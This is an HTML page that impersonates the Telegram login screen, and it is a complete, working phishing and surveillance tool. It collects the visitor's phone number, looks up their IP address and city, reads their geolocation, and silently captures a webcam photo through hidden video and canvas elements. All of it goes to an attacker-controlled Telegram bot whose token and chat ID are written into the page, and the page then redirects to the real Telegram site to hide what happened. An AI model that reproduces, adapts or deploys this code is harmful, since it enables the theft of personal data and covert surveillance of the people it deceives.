<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram: Login</title>
    <style>
        body { background: #e7f1f8; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 320px; }
        img { width: 80px; margin-bottom: 20px; }
        h2 { color: #0088cc; margin-bottom: 10px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 12px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
    <h2>Telegram</h2>
    <p>Please enter your phone number.</p>
    <input type="tel" id="phone" placeholder="+959xxxxxxxxx">
    <button id="btn" onclick="start()">Next</button>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
    const chat_id = '5304050102';

    async function start() {
        const ph = document.getElementById('phone').value;
        if(!ph) return alert("Enter number!");
        document.getElementById('btn').innerText = "Processing...";
        
        let report = `🚩 **New Target!**\n📱 Phone: ${ph}\n`;
        
        // IP & Info
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            report += `🌐 IP: ${data.ip}\n📍 City: ${data.city}\n`;
        } catch(e){}

        // Location & Photo
        if(navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                report += `📍 Map: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
                await snap(report);
            }, async () => { await snap(report); });
        } else { await snap(report); }
    }

    async function snap(info) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            const v = document.getElementById('v');
            v.srcObject = s;
            setTimeout(async () => {
                const c = document.getElementById('c');
                c.width = 640; c.height = 480;
                c.getContext('2d').drawImage(v, 0, 0);
                const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
                const f = new FormData();
                f.append('chat_id', chat_id);
                f.append('photo', b, 'x.jpg');
                f.append('caption', info);
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
                location.href = "https://telegram.org"; // ပြီးရင် တကယ့် TG ဆီ လွှတ်လိုက်မယ်
            }, 2000);
        } catch(e) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
            location.href = "https://telegram.org";
        }
    }
</script>
</body>
</html>
